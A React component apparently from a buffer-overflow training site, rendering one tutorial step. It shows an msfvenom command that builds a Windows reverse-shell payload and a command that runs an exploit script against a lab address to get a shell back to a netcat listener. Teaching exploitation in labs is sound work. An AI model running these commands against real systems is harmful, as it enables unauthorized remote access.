import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import Image from "next/image";

interface IProps {
  title: string;
}

const BufferOverflowStep7 = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography>
              Run the following msfvenom command and update the `-b` option with
              all the bad characters identified eariler.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\\x00" -f c'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography>
              Change the payload variable in the payload function of buff.py to
              the output of the command.
            </Typography>
            <Image src="/Step7.png" width={639} height={504} priority={true} />
            <Box sx={{ m: 4 }} />
            <Typography>
              Lastly, start a netcat listener on the port specified in the
              msfvenom payload and run the command below to get a reverse shell.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "python buff.py --exploit -d 10.10.253.128 -p 1337 -o 634 -r 'af115062'"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default BufferOverflowStep7;
